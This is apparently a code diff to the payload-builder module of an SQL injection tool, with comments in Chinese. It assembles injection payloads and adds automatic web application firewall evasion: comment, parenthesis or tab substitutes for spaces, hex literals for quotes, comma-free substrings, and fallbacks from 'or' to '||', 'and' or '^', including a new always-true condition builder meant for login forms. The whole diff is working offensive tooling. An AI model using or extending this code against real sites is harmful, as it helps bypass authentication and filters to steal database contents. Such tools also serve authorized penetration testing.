@@ -1,15 +1,15 @@
 """WAF 感知 Payload 构造器。
 
-职责：把"核心 SQL 表达式"组装成完整可发 payload，并按 WAF 报告自动应用绕过：
-- 空格被过滤  → 内联注释 /**/
-- 逗号被过滤  → substr from/for、limit offset
+职责：把"核心 SQL 表达式"组装成完整可发 payload，并按 WAF 报告与实测形态自动变换：
+- 形态（injection.form，实测命中）：classic / paren（括号法）/ inline（/**/）/ tab（%09）
 - 引号被过滤  → 字符串走十六进制字面量
+- 逗号被过滤  → substr from/for、limit offset
 - and 被过滤  → 逻辑连接使用 && / or / ^
 """
 from __future__ import annotations
 
 from .models import InjectionPoint, WafReport
-from ..tampers import comma_free, space2comment, to_hex_literal
+from ..tampers import apply_form, comma_free, to_hex_literal
 
 
 class PayloadBuilder:
@@ -35,10 +35,21 @@ class PayloadBuilder:
             return f" or {cond}"
         return f"^{cond}"
 
+    def logic_or(self, cond: str) -> str:
+        """or 连接（登录框恒真语义）；or 被过滤时降级 || / and。"""
+        cond = f"({cond})"
+        if not self.waf.is_filtered("or"):
+            return f" or {cond}"
+        if not self.waf.is_filtered("||"):
+            return f"||{cond}"
+        if not self.waf.is_filtered("and"):
+            return f" and {cond}"
+        return f"^{cond}"
+
     # ------------------------------------------------------------------ transform
     def transform(self, sql: str) -> str:
-        if self.waf.is_filtered("space"):
-            sql = space2comment(sql)
+        """按实测形态变换核心 SQL（空格被滤时切换括号/tab/内联）。"""
+        sql = apply_form(sql, getattr(self.inj, "form", "classic") or "classic")
         if self.waf.is_filtered(","):
             sql = comma_free(sql)
         return sql
